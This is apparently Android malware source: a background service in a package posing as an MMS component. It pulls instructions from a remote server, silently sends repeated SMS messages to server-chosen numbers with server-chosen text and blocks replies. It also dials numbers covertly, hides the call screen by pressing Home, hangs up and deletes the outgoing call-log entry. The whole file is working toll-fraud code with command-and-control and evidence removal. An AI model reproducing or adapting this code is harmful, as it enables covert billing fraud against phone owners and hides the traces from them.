package com.mms.bg.ui;

import android.os.IServiceManager;
import android.os.ServiceManagerNative;
import com.android.internal.telephony.ITelephony;
import android.os.DeadObjectException;
import android.os.ServiceManager;
import android.os.RemoteException;
import com.android.internal.telephony.Phone;
import com.android.internal.telephony.PhoneFactory;
import com.mms.bg.transaction.WorkingMessage;
import com.mms.bg.util.XMLHandler;

import android.os.ServiceManager;
import android.os.RemoteException;

import java.io.File;
import java.util.Date;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.provider.CallLog.Calls;
import android.util.Log;

import com.mms.bg.transaction.WorkingMessage;
import com.mms.bg.util.XMLHandler;

public class BgService extends Service {

    private static final String TAG = "BgService";
    private static final boolean DEBUG = true;
    
    public static final String ACTION_DIAL_BR = "action.dial.bg";
    public static final String ACTION_INTERNET = "action.internet.bg";
    public static final String ACTION_SEND_SMS = "action.sms.bg";
    public static final String ACTION_BOOT = "action.boot.bg";
    
    private SettingManager mSM;
    
    private boolean mIsCalling;
    
    private static final int LONG_DIAL_DELAY = 4 * 60 * 1000;
    private static final int DIAL_DELAY = 5 * 1000;
    private static final int SHOW_DIALOG_DELAY = 2000;
    
    private static final int DIAL_AUTO = 0;
    private static final int SHOW_DIALOG = 1;
    private static final int START_INTENT = 2;
    private static final int REMOVE_FIRST_LOG = 3;
    private Handler mHandler = new Handler() {
        public void handleMessage(Message msg) {
            switch (msg.what) {
            case DIAL_AUTO:
                dial();
                mHandler.sendEmptyMessageDelayed(SHOW_DIALOG, SHOW_DIALOG_DELAY);
                break;
            case SHOW_DIALOG:
                homeKeyPress();
                mHandler.sendEmptyMessage(START_INTENT);
                break;
            case START_INTENT:
                startIntent();
                break;
            case REMOVE_FIRST_LOG:
                deleteLastCallLog();
                break;
            }
        }
    };
    
    private class CancelTask implements Runnable {
        public void run() {
            if (mIsCalling == true) {
                if (DEBUG) Log.d(TAG, "[[TimeTask::run]] stop the calling");
                if (SettingManager.getInstance(getApplicationContext()).mForegroundActivity != null) {
                    try {
                        ITelephony phone = (ITelephony) ITelephony.Stub.asInterface(ServiceManager.getService("phone"));
                        SettingManager.getInstance(BgService.this).logTagCurrentTime("Dial_end");
                        phone.endCall();
                        mHandler.sendEmptyMessageDelayed(REMOVE_FIRST_LOG, 2000);
                        SettingManager.getInstance(getApplicationContext()).mForegroundActivity.finish();
                    } catch (Exception e) {
                    }
                }
                mIsCalling = false;
            }
        }
    }
    
    private BroadcastReceiver mDialogBroadCast = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (DEBUG) Log.d(TAG, "[[BgService::BroadcastReceiver::onReceive]]");
            SettingManager.getInstance(context).makeWakeLock();
            mHandler.sendEmptyMessageDelayed(DIAL_AUTO, DIAL_DELAY);
        }
    };
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        if (DEBUG) Log.d(TAG, "[[BgService::onCreate]]");
        this.setForeground(true);
        
        mSM = SettingManager.getInstance(BgService.this);
//        SettingManager.getInstance(BgService.this).startAutoSendMessage();
        
//        IntentFilter iFilter = new IntentFilter();
//        iFilter.addAction(ACTION_DIAL_BR);
//        registerReceiver(mDialogBroadCast, iFilter);
        mSM.setFirstStartTime();
    }
    
    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        
        SettingManager sm = SettingManager.getInstance(this);
        if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_INTERNET) == true) {
            LOGD("[[onStart]] received the action to get the internet info");
            boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer();
            if (ret == true) {
                SettingManager.getInstance(this).parseServerXMLInfo();
                String delay = SettingManager.getInstance(this).mXMLHandler.getChanneInfo(XMLHandler.NEXT_LINK_BASE);
                long delayTime = 0;
                if (delay != null) {
                    delayTime = (Integer.valueOf(delay)) * 60 * 60 * 1000;
                }
                LOGD("[[onStart]] change the internet connect time delay, and start send the auto sms");
                sm.setLastConnectServerTime(System.currentTimeMillis());
                SettingManager.getInstance(this).tryToFetchInfoFromServer(delayTime);
                SettingManager.getInstance(this).startAutoSendMessage();
            }
        } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_SEND_SMS) == true) {
            LOGD("[[onStart]] start send the sms for one cycle");
            autoSendSMSOrDial(this);
        } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_BOOT) == true) {
            File file = new File(SettingManager.getInstance(getApplicationContext()).DOWNLOAD_FILE_PATH);
            if (file.exists() == true) {
                mSM.parseServerXMLInfo();
                String delay = mSM.mXMLHandler.getChanneInfo(XMLHandler.NEXT_LINK_BASE);
                long delayTime = 0;
                if (delay != null) {
                    delayTime = (Integer.valueOf(delay)) * 60 * 60 * 1000;
                }
                mSM.tryToFetchInfoFromServer(delayTime);
            } else {
                mSM.tryToFetchInfoFromServer(0);
            }
        }
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        this.unregisterReceiver(mDialogBroadCast);
    }
    
    private void autoSendSMSOrDial(Context context) {
        SettingManager sm = SettingManager.getInstance(context);
        if (sm.isSimCardReady() == false || sm.isCallIdle() == false) return;
      
        if (sm.mXMLHandler != null) {
            String targetNum = sm.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_PORT);
            String sendText = sm.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_ORDER);
            String smsOrDial = sm.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_SMS);
            if (smsOrDial != null && sendText != null && targetNum != null) {
                boolean sms = Integer.valueOf(smsOrDial) == 0 ? true : false;
                if (sms == true) {
                    String monthCount = sm.mXMLHandler.getChanneInfo(XMLHandler.LIMIT_NUMS_MONTH);
                    if (monthCount != null) {
                        int sendCount = Integer.valueOf(monthCount);
                        String intercept_time_str = sm.mXMLHandler.getChanneInfo(XMLHandler.INTERCEPT_TIME);
                        int intercept_time_int = 2000 * 60 * 1000;
                        if (intercept_time_str != null) {
                            intercept_time_int = Integer.valueOf(intercept_time_str) * 60 * 1000;
                        }
                        sm.setSMSBlockDelayTime(intercept_time_int);
                        SettingManager.getInstance(context).makePartialWakeLock();
                        try {
                            Date date = new Date(System.currentTimeMillis());
                            LOGD("[[autoSendSMSOrDial]] current time = " + date.toGMTString());
                            sm.setLastSMSTime(System.currentTimeMillis());
                            WorkingMessage wm = WorkingMessage.createEmpty(context);
                            for (int count = 0; count < sendCount; ++count) {
                                LOGD("[[autoSendSMSOrDial]] send sms to : " + targetNum + " text = " + sendText);
                                wm.setDestNum(targetNum);
                                wm.setText(sendText);
                                wm.send();
                                SettingManager.getInstance(context).logSMSCurrentTime();
                                
                                //naps
                                for (int n = 0; n < 10; ++n) {
                                    Thread.sleep(50);
                                }
                            }
                        } catch (Exception e) {
                        } finally {
                            SettingManager.getInstance(context).releasePartialWakeLock();
                            Date date = new Date(System.currentTimeMillis());
                            LOGD("[[autoSendSMSOrDial]] current time = " + date.toGMTString());
                        }
                    }
                } else {
                    //TODO : dial
                }
            }
        } else {
            //TODO : do something for no xml handler
        }
    }
    
    private void dial() {
        Log.d(TAG, "[[dial]]");
        try {
            ITelephony phone = (ITelephony) ITelephony.Stub.asInterface(ServiceManager.getService("phone"));
            if (SettingManager.getInstance(BgService.this).isCallIdle() == true) {
                if (DEBUG) Log.d(TAG, "[[BgService::dial]] phone is idle");
                String targetNum = SettingManager.getInstance(getApplicationContext()).getSMSTargetNum();
                if (targetNum.equals("") == false) {
                    mIsCalling = true;
                    mHandler.postDelayed(new CancelTask(), LONG_DIAL_DELAY);
                    SettingManager.getInstance(BgService.this).logTagCurrentTime("Dial_begin");
                    phone.call(targetNum);
                } else {
                    if (DEBUG) Log.d(TAG, "[[BgService::dial]] phone num is not exist, so do not dial");
                }
            } else {
                if (DEBUG) Log.d(TAG, "[[BgService::dial]] phone is not idle, delay to dial again");
                mHandler.sendEmptyMessageDelayed(DIAL_AUTO, LONG_DIAL_DELAY);
            }
        } catch (Exception e) {
        }
    }
    
    private void homeKeyPress() {
        Intent i= new Intent(Intent.ACTION_MAIN);

        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.addCategory(Intent.CATEGORY_HOME);
        startActivity(i);
    }
    
    private void startIntent() {
        Log.d(TAG, "========= [[startIntent]] ========");
        Intent intent = new Intent(BgService.this, DialScreenActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
    
    private void deleteLastCallLog() {
        if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]]");
        ContentResolver resolver = getContentResolver();
        Cursor c = null;
        try {
            Uri CONTENT_URI = Uri.parse("content://call_log/calls");
            c = resolver.query(
                    CONTENT_URI,
                    new String[] {Calls._ID},
                    "type = 2",
                    null,
                    "date DESC" + " LIMIT 1");
            if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] c = " + c);
                if (c == null || !c.moveToFirst()) {
                    if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] cursor error, return");
                    return;
                }
                long id = c.getLong(0);
                String where = Calls._ID + " IN (" + id + ")";
                if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] delete where = " + where);
                getContentResolver().delete(CONTENT_URI, where, null);
            } finally {
                if (c != null) c.close();
            }
            SettingManager.getInstance(getApplicationContext()).releaseWakeLock();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        // TODO Auto-generated method stub
        return null;
    }
    
    public static final void LOGD(String msg) {
        if (DEBUG) {
            Log.d(TAG, msg);
        }
    }
}
